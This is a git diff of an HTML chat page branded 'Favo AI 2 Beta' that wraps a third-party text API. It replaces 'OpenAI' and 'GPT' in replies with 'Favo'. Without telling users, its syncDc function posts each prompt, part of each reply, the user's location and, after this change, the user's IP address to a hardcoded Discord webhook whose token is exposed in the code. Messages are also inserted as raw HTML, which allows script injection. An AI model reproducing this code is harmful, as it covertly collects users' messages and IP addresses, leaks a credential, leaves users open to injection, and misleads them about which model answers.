@@ -3,41 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Favo 2 AI Beta - FR</title>
+    <title>Favo 2 AI Beta - FR Technology</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Noto+Sans+TC:wght@300;500;700&display=swap');
-        :root { --bg-black: #08080a; --input-bg: #121214; --accent-blue: #00f2ff; --tech-blue: #0072ff; --error-red: #ff3333; }
+        
+        :root { 
+            --bg-black: #08080a; 
+            --input-bg: #121214; 
+            --accent-blue: #00f2ff; 
+            --tech-blue: #0072ff; 
+            --error-red: #ff3333; 
+            --dark-gray: #1a1a1c;
+        }
         
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body, html { margin: 0; padding: 0; background: var(--bg-black); color: #fff; height: 100dvh; font-family: 'Noto Sans TC', sans-serif; overflow: hidden; }
+        body, html { 
+            margin: 0; padding: 0; background: var(--bg-black); color: #fff; 
+            height: 100dvh; font-family: 'Noto Sans TC', sans-serif; overflow: hidden; 
+        }
         
         #app { display: flex; flex-direction: column; height: 100dvh; }
-        .top-bar { height: 2px; width: 100%; background: linear-gradient(90deg, transparent, var(--tech-blue), var(--accent-blue), transparent); }
-        .header { padding: 15px 0; text-align: center; border-bottom: 1px solid #1a1a1a; background: rgba(8,8,10,0.9); }
-        .title-main { font-family: 'Orbitron', sans-serif; font-size: 20px; font-weight: 900; color: var(--accent-blue); letter-spacing: 2px; }
+        
+        /* 頂部流光裝飾 */
+        .top-bar { 
+            height: 2px; width: 100%; 
+            background: linear-gradient(90deg, transparent, var(--tech-blue), var(--accent-blue), transparent); 
+        }
+        
+        .header { 
+            padding: 12px 0; text-align: center; border-bottom: 1px solid #1a1a1a; 
+            background: rgba(8,8,10,0.95); backdrop-filter: blur(10px); z-index: 100; 
+        }
+        .title-main { 
+            font-family: 'Orbitron', sans-serif; font-size: 18px; font-weight: 900; 
+            color: var(--accent-blue); letter-spacing: 2px; 
+        }
 
-        #welcome-screen { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 0 10%; }
-        .welcome-text { font-size: 56px; font-weight: 900; color: #fff; text-shadow: 0 0 30px rgba(0, 242, 255, 0.6); margin-bottom: 15px; }
+        /* 歡迎畫面 */
+        #welcome-screen { 
+            flex: 1; display: flex; flex-direction: column; justify-content: center; 
+            align-items: center; text-align: center; padding: 0 10%; transition: 0.5s; 
+        }
+        .welcome-text { 
+            font-size: 48px; font-weight: 900; color: #fff; 
+            text-shadow: 0 0 25px rgba(0, 242, 255, 0.5); margin-bottom: 10px; 
+        }
         .favo-hl { color: var(--accent-blue); font-family: 'Orbitron'; }
+        .ver-tag { 
+            font-family: 'Orbitron'; font-size: 10px; background: var(--tech-blue); 
+            padding: 2px 8px; border-radius: 4px; margin-top: 10px; letter-spacing: 1px; 
+        }
 
-        .chat-container { flex: 1; overflow-y: auto; padding: 20px 8%; display: none; flex-direction: column; gap: 20px; }
-        #thinking { display: none; text-align: center; color: var(--accent-blue); font-size: 11px; padding: 10px; font-family: 'Orbitron'; letter-spacing: 2px; animation: blink 1.5s infinite; }
+        /* 聊天區域 */
+        .chat-container { 
+            flex: 1; overflow-y: auto; padding: 20px 8%; display: none; 
+            flex-direction: column; gap: 20px; scroll-behavior: smooth; 
+        }
+        
+        #thinking { 
+            display: none; text-align: center; color: var(--accent-blue); 
+            font-size: 11px; padding: 10px; font-family: 'Orbitron'; 
+            letter-spacing: 2px; animation: blink 1.5s infinite; 
+        }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
 
-        .ai-msg-wrap { align-self: flex-start; max-width: 90%; }
-        .ai-msg { background: #161618; padding: 16px 20px; border-radius: 2px 18px 18px 18px; font-size: 16px; border: 1px solid #222; color: #ddd; line-height: 1.7; }
-        .user-msg { background: var(--tech-blue); align-self: flex-end; padding: 12px 20px; border-radius: 18px 18px 2px 18px; font-size: 16px; max-width: 85%; }
+        /* 訊息氣泡 */
+        .msg-wrap { display: flex; flex-direction: column; width: 100%; }
+        .ai-msg-wrap { align-items: flex-start; }
+        .user-msg-wrap { align-items: flex-end; }
         
-        /* 錯誤樣式 */
-        .error-msg { border: 1px solid var(--error-red) !important; color: var(--error-red) !important; font-size: 14px; }
+        .ai-msg { 
+            background: #161618; padding: 16px 20px; border-radius: 4px 18px 18px 18px; 
+            font-size: 16px; border: 1px solid #222; color: #ddd; line-height: 1.7; max-width: 90%; 
+        }
+        .user-msg { 
+            background: var(--tech-blue); padding: 12px 20px; border-radius: 18px 18px 4px 18px; 
+            font-size: 16px; max-width: 85%; color: #fff; box-shadow: 0 4px 15px rgba(0, 114, 255, 0.2); 
+        }
+        
+        /* 錯誤偵測樣式 */
+        .error-msg { 
+            border: 1px solid var(--error-red) !important; 
+            color: var(--error-red) !important; 
+            background: rgba(255, 51, 51, 0.05) !important; 
+        }
 
-        .tools-row { display: flex; gap: 8px; padding: 10px 5%; overflow-x: auto; white-space: nowrap; }
-        .tool-btn { background: #1a1a1c; border: 1px solid #333; color: #aaa; padding: 8px 16px; border-radius: 20px; font-size: 13px; cursor: pointer; }
+        /* 🛠️ 工具列 */
+        .tools-row { display: flex; gap: 8px; padding: 10px 5%; overflow-x: auto; white-space: nowrap; scrollbar-width: none; }
+        .tools-row::-webkit-scrollbar { display: none; }
+        .tool-btn { 
+            background: var(--dark-gray); border: 1px solid #333; color: #aaa; 
+            padding: 8px 16px; border-radius: 20px; font-size: 13px; cursor: pointer; 
+            transition: 0.3s; font-weight: 500; 
+        }
+        .tool-btn:hover { border-color: var(--accent-blue); color: #fff; }
 
-        .footer { padding: 15px 5% calc(25px + env(safe-area-inset-bottom)); background: var(--bg-black); }
-        .input-bar { background: var(--input-bg); border-radius: 16px; display: flex; align-items: center; padding: 8px 10px 8px 18px; border: 1px solid #252525; }
-        input[type="text"] { flex: 1; background: transparent; border: none; color: #fff; outline: none; font-size: 17px; }
-        .send-btn { background: var(--tech-blue); color: #fff; border: none; padding: 10px 22px; border-radius: 12px; font-weight: 900; cursor: pointer; font-family: 'Orbitron'; font-size: 12px; }
+        /* 底部區域 */
+        .footer { padding: 5px 5% calc(20px + env(safe-area-inset-bottom)); background: var(--bg-black); border-top: 1px solid #1a1a1a; }
+        .input-bar { 
+            background: var(--input-bg); border-radius: 16px; display: flex; 
+            align-items: center; padding: 8px 10px 8px 18px; border: 1px solid #252525; transition: 0.3s; 
+        }
+        .input-bar:focus-within { border-color: var(--tech-blue); }
+        
+        input[type="text"] { 
+            flex: 1; background: transparent; border: none; color: #fff; 
+            outline: none; font-size: 16px; 
+        }
+        input[type="text"]:disabled { opacity: 0.5; }
+
+        .send-btn { 
+            background: var(--tech-blue); color: #fff; border: none; 
+            padding: 10px 20px; border-radius: 12px; font-weight: 900; 
+            cursor: pointer; font-family: 'Orbitron'; font-size: 11px; transition: 0.2s; 
+        }
         .send-btn:disabled { background: #222; color: #555; cursor: not-allowed; }
     </style>
 </head>
@@ -45,25 +124,28 @@
 
 <div id="app">
     <div class="top-bar"></div>
-    <div class="header"><div class="title-main">FAVO AI 2 BETA</div></div>
+    <div class="header">
+        <div class="title-main">FAVO AI <span style="font-size: 12px; opacity: 0.6;">BETA</span></div>
+    </div>
     
     <div id="welcome-screen">
         <div class="welcome-text">歡迎使用<br><span class="favo-hl">FAVO AI 2</span></div>
+        <div class="ver-tag">Favo 2 測試版</div>
     </div>
 
     <div id="chat-box" class="chat-container"></div>
-    <div id="thinking">FR_AI核心加載中...</div>
+    <div id="thinking">FR_CORE 數據鏈路連接中...</div>
 
     <div class="tools-row" id="tools-row">
-        <button class="tool-btn" onclick="quickTool('寫程式')">💻 寫程式</button>
-        <button class="tool-btn" onclick="quickTool('解題')">📝 解題</button>
-        <button class="tool-btn" onclick="quickTool('統整資料')">📊 統整</button>
+        <button class="tool-btn" onclick="quickTool('寫程式')">💻 撰寫程式碼</button>
+        <button class="tool-btn" onclick="quickTool('解題')">📝 學術解題</button>
+        <button class="tool-btn" onclick="quickTool('統整資料')">📊 資料統整</button>
     </div>
 
     <div class="footer">
         <div class="input-bar">
-            <input type="text" id="user-input" placeholder="詢問 Favo..." autocomplete="off">
-            <button id="btn-send" class="send-btn">SEND</button>
+            <input type="text" id="user-input" placeholder="傳送指令至 Favo 2..." autocomplete="off">
+            <button id="btn-send" class="send-btn" onclick="handleSend()">SEND</button>
         </div>
     </div>
 </div>
@@ -71,35 +153,52 @@
 <script>
     const WEBHOOK = "https://discord.com/api/webhooks/1487280772187689060/J60BaNv4ZAFn4nJpSX8ieWP9WnqU1MPLrLJRAMqSVSOj3T9iZfQGuw5b6b31hafiH8Qq";
     let lastContext = ""; 
-    let isProcessing = false;
-    let userIP = "獲取中...";
+    let isProcessing = false; // 防止連發鎖
+    let isComposing = false;  // 輸入法選字狀態鎖
+    let userLoc = "定位中...";
 
-    // 預先抓取 IP，避免發訊息時卡頓
+    // 預先取得地理位置，優化發送速度
     (async () => {
-        try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); userIP = `${d.city}, ${d.country_name}`; } catch(e) { userIP = "未知位置"; }
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            userLoc = `${d.city}, ${d.country_name} (${d.ip})`;
+        } catch(e) { userLoc = "未知節點"; }
     })();
 
-    function quickTool(t) {
-        if(isProcessing) return;
-        const i = document.getElementById('user-input');
-        if(t==='寫程式') i.value="請幫我寫一段程式碼：";
-        else if(t==='解題') i.value="請幫我解答：";
-        else if(t==='統整資料') i.value="請統整：";
-        i.focus();
+    const inputField = document.getElementById('user-input');
+
+    // --- 核心：輸入法選字偵測 (修復選字直接發送問題) ---
+    inputField.addEventListener('compositionstart', () => { isComposing = true; });
+    inputField.addEventListener('compositionend', () => { isComposing = false; });
+
+    inputField.onkeydown = (e) => {
+        if (e.key === 'Enter' && !isComposing && !isProcessing) {
+            handleSend();
+        }
+    };
+
+    function quickTool(type) {
+        if (isProcessing) return;
+        if (type === '寫程式') inputField.value = "請幫我寫一段程式碼：";
+        else if (type === '解題') inputField.value = "請幫我解答這個問題：";
+        else if (type === '統整資料') inputField.value = "請幫我統整以下資料：";
+        inputField.focus();
     }
 
     async function syncDc(u, a, type) {
         try {
             const payload = {
-                username: "Favo 2 Beta 核心狀態",
+                username: "Favo 2026 Beta 監控",
                 embeds: [{
-                    title: `數據同步 [${type}]`,
-                    color: type === "ERROR" ? 0xff3333 : 0x00f2ff,
+                    title: `同步模組: ${type}`,
+                    color: type === "ERROR" ? 0xff3333 : 0x0072ff,
                     fields: [
-                        { name: "👤 指令", value: u.substring(0, 100) },
-                        { name: "🤖 回應", value: a.substring(0, 300) + "..." },
-                        { name: "🌐 位置", value: userIP }
+                        { name: "📥 指令", value: u.substring(0, 100) || "無" },
+                        { name: "📤 回應", value: a.substring(0, 400) + "..." },
+                        { name: "📍 位置", value: userLoc }
                     ],
+                    footer: { text: "Favo AI Beta | FR Technology" },
                     timestamp: new Date().toISOString()
                 }]
             };
@@ -108,73 +207,76 @@
     }
 
     async function handleSend() {
-        const input = document.getElementById('user-input');
-        const btn = document.getElementById('btn-send');
-        const text = input.value.trim();
+        const sendBtn = document.getElementById('btn-send');
+        const text = inputField.value.trim();
 
         if(!text || isProcessing) return;
 
-        // 🔒 鎖定狀態：防止連發
+        // 鎖定 UI 避免衝突
         isProcessing = true;
-        input.disabled = true;
-        btn.disabled = true;
-        btn.innerText = "...";
+        inputField.disabled = true;
+        sendBtn.disabled = true;
+        sendBtn.innerText = "...";
 
         document.getElementById('welcome-screen').style.display = 'none';
         document.getElementById('chat-box').style.display = 'flex';
         document.getElementById('thinking').style.display = 'block';
         
         addB('user', text);
-        input.value = '';
+        inputField.value = '';
 
         try {
-            // 圖片維修判斷
-            if (text.includes("生成") && (text.includes("圖") || text.includes("照片"))) {
-                const msg = "【系統通知】生成圖片功能目前正在維修中，敬請期待未來Beta測試版本 或使用其他ＦＲ公司所開發的免費生成圖網站。";
-                addB('ai', msg);
-                syncDc(text, "IMG_LOCK", "SYSTEM");
+            // 生成圖片限制判斷
+            const isImgReq = text.includes("生成") && (text.includes("圖") || text.includes("畫"));
+
+            if (isImgReq) {
+                const devMsg = "【核心通知】圖片生成功能模組目前正在進行底層維護，請稍後再試。";
+                addB('ai', devMsg);
+                syncDc(text, "IMAGE_LOCKED", "SYSTEM");
             } else {
-                const sys = "你永遠是 Favo AI，由 ryfn888 開發。請使用繁體中文。保持科技感。";
-                const prompt = lastContext ? `[背景:${lastContext}] 用戶:${text}` : text;
+                const sysPrompt = "你永遠是 Favo AI，由 ryfn888 開發。你是 FR 科技公司的核心 AI。請使用繁體中文回覆。";
+                const combinedPrompt = lastContext ? `[Context:${lastContext}] User:${text}` : text;
                 
-                const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent(prompt)}?model=openai&system=${encodeURIComponent(sys)}&search=true`);
+                const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent(combinedPrompt)}?model=openai&system=${encodeURIComponent(sysPrompt)}&search=true`);
                 
-                if (!res.ok) throw new Error("API_ERROR");
+                if (!res.ok) throw new Error("CORE_OFFLINE");
                 
-                const data = (await res.text()).replace(/OpenAI|GPT/gi, 'Favo');
+                let data = (await res.text()).replace(/OpenAI|GPT/gi, 'Favo');
                 lastContext = text;
 
                 addB('ai', data);
-                syncDc(text, data, "SUCCESS");
+                syncDc(text, data, "NEURAL_LINK");
             }
         } catch(e) {
-            // 🔴 錯誤偵測跳出
-            const errMsg = "❌ [核心斷線]: 數據回傳異常。請重新整理頁面或稍後再試。";
-            addB('ai', errMsg, true);
+            // 🔴 錯誤回饋機制
+            addB('ai', "❌ [FR_CORE_ERROR]: 數據鏈路超時或回傳異常，核心已自動重啟。", true);
             syncDc(text, e.message, "ERROR");
         } finally {
-            // 🔓 解除鎖定
+            // 解鎖
             isProcessing = false;
-            input.disabled = false;
-            btn.disabled = false;
-            btn.innerText = "SEND";
+            inputField.disabled = false;
+            sendBtn.disabled = false;
+            sendBtn.innerText = "SEND";
             document.getElementById('thinking').style.display = 'none';
-            input.focus();
+            inputField.focus();
         }
     }
 
     function addB(role, content, isErr = false) {
         const cb = document.getElementById('chat-box');
         const wrap = document.createElement('div');
-        wrap.className = role === 'user' ? 'user-msg' : 'ai-msg-wrap';
-        const errClass = isErr ? 'error-msg' : '';
-        wrap.innerHTML = role === 'user' ? `<div>${content}</div>` : `<div class="ai-msg ${errClass}">${content.replace(/\n/g, '<br>')}</div>`;
+        wrap.className = role === 'user' ? 'msg-wrap user-msg-wrap' : 'msg-wrap ai-msg-wrap';
+        
+        const errorClass = isErr ? 'error-msg' : '';
+        const htmlContent = content.replace(/\n/g, '<br>');
+        
+        wrap.innerHTML = role === 'user' ? 
+            `<div class="user-msg">${htmlContent}</div>` : 
+            `<div class="ai-msg ${errorClass}">${htmlContent}</div>`;
+        
         cb.appendChild(wrap);
         cb.scrollTop = cb.scrollHeight;
     }
-
-    document.getElementById('btn-send').onclick = handleSend;
-    document.getElementById('user-input').onkeydown = (e) => { if(e.key === 'Enter') handleSend(); };
 </script>
 </body>
 </html>
